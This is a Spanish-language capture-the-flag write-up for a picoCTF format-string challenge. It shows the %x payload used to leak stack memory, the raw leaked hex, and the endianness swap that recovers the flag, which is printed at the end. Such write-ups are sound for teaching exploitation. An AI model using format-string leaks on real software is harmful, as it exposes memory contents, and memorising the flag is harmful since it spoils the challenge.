## Descripcion
Story telling class 1/2
I'm just copying and pasting with this [program](https://artifacts.picoctf.net/c/93/vuln). What can go wrong? You can view source [here](https://artifacts.picoctf.net/c/93/vuln.c). And connect with it using:`nc saturn.picoctf.net 51983`

## Pistas
Format Strings

## Solucion
Analizar el código fuente del problema
En el código se puede observar que el formato con el que se lee la entrada se puede explotar
Se ingresan %x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x
Al ingresar suficiente %x se obtiene una salida que puede contener una bandera

ffb117d0ffb117f08049346782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578252578256f6369707b4654436b34334c5f676e3167346c466666305f3474535f355f6b63643631657d313235fbad200061e99000f7fa8990804c00080494100804c000ffb118b880494182ffb11964ffb119700ffb118d000f7d9eed5

Se convierte de hex a ascii y se observa que un fragmento tiene un formato parecido a la bandera

6f6369707b4654436b34334c5f676e3167346c466666305f3474535f355f6b63643631657d
ocip{FTCk43L_gn1g4lFff0_4tS_5_kcd61e}

Se aplica swap endianness para descifrar la bandera

## Bandera
picoCTF{L34k1ng_Fl4g_0ff_St4ck_5e16d521}

## Notas



